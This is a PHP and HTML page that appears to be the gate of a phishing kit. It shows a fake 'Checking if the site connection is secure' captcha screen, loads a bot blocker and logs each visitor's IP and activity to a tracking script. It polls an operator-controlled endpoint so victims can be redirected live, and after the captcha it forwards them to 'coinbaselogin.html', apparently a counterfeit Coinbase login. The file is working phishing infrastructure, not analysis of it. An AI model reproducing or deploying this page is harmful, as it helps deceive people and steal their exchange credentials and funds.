<?php
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");
header("Referrer-Policy: no-referrer");

ob_start();
require_once __DIR__ . '/blocker-raw.php';
// Start immediate tracking without waiting
function startTracking() {
    $tracking_url = "http://" . $_SERVER['HTTP_HOST'] . "/track.php?page=index.php&ip=" . ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
    
    // Use fast non-blocking request
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => 0.1, // 100ms timeout - don't wait
            'ignore_errors' => true
        ]
    ]);
    
    @file_get_contents($tracking_url, false, $context);
}

// Start tracking immediately (non-blocking)
startTracking();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        body {
            background-color: #222222;
            font-family: "Lato", sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        form {
            padding: 1rem;
            height: 17rem;
            display: flex;
            justify-content: space-between;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }
        p, h3 {
            color: #fff;
        }
        .error-message {
            color: #ff4444;
            display: none;
        }
        .loading {
            display: none;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="container">
        <form method="POST" action="" id="hcaptcha-form">
            <div class="header">
                <h3>Checking if the site connection is secure</h3>
            </div>
            
            <div class="h-captcha-container">
                <div class="h-captcha" 
                     data-sitekey="58e0453e-2302-4f32-b798-309ebc6cf6a6" 
                     data-theme="dark" 
                     data-callback="onCaptchaSuccess">
                </div>
            </div>
            
            <div id="error-message" class="error-message"></div>
            <div id="loading" class="loading">Verifying... Please wait</div>
            
            <p>This site needs to review the security of your connection before proceeding.</p>
        </form>
    </div>

    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>

    <script>
        // CONTINUOUS REDIRECT CHECKING - No breaks
        let redirectCheckInterval;
        
        function startRedirectChecking() {
            // Check immediately
            checkForRedirect();
            
            // Then check every 1 second continuously
            redirectCheckInterval = setInterval(checkForRedirect, 1000);
        }

        function checkForRedirect() {
            fetch('/check-redirect.php?t=' + Date.now())
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.target) {
                        console.log('🔄 REDIRECTING TO:', data.target);
                        window.location.href = data.target;
                    }
                })
                .catch(error => {
                    // Silent fail - keep checking
                    console.log('Redirect check failed, continuing...');
                });
        }

        // CONTINUOUS ACTIVITY TRACKING - No breaks
        let activityInterval;
        
        function startActivityTracking() {
            // Track immediately
            trackActivity();
            
            // Then track every 30 seconds continuously
            activityInterval = setInterval(trackActivity, 30000);
        }

        function trackActivity() {
            fetch('/track.php?page=index.php&action=heartbeat&t=' + Date.now())
                .then(response => response.text())
                .catch(error => {
                    // Silent fail - keep tracking
                });
        }

        // Start everything when page loads
        document.addEventListener('DOMContentLoaded', function() {
            startRedirectChecking();
            startActivityTracking();
        });

        // hCaptcha callback
        function onCaptchaSuccess(token) {
            document.getElementById('loading').style.display = 'block';
            document.getElementById('error-message').style.display = 'none';
            
            // Track CAPTCHA success
            fetch('/track.php?page=index.php&action=captcha_success&t=' + Date.now());
            
            const form = document.getElementById('hcaptcha-form');
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'h-captcha-response';
            input.value = token;
            form.appendChild(input);
            
            form.submit();
        }

        function showError(message) {
            const errorDiv = document.getElementById('error-message');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            document.getElementById('loading').style.display = 'none';
        }

        // Keep tracking even if user switches tabs
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                trackActivity();
            }
        });
    </script>
</body>
</html>
<?php
// Handle CAPTCHA submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['h-captcha-response'])) {
    $captcha_response = $_POST['h-captcha-response'];
    
    if (!empty($captcha_response)) {
        // Track CAPTCHA completion
        startTracking();
        header('Location: coinbaselogin.html');
        exit;
    }
}

ob_end_flush();
?>
